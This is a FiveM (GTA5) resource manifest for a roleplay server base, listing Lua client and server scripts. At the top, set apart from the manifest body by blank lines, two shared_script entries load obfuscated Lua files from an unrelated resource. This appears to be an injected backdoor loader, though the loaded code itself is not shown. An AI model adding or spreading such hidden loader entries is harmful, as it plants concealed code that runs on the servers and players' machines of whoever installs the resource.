shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'






fx_version 'cerulean'
game 'gta5'
lua54 'on'

author 'Erdem Goren'
description 'GG Dev Base'
version '1.0.0'

client_scripts {
    'client/bayılma.lua',
    'client/dipcik.lua',
    'client/illegaldoktor.lua',
    'client/kask.lua',
    'client/npc.lua',
    'client/omuzla.lua',
    'client/harita.lua',
    'client/antibadcop.lua',
    'client/handsup.lua',
    'client/shiftr.lua',
    'client/antidriveby.lua',
}

server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'server/etkinlikutu.lua',
    'server/omuzla.lua',
    'server/ck.lua'
}
lua54 'yes'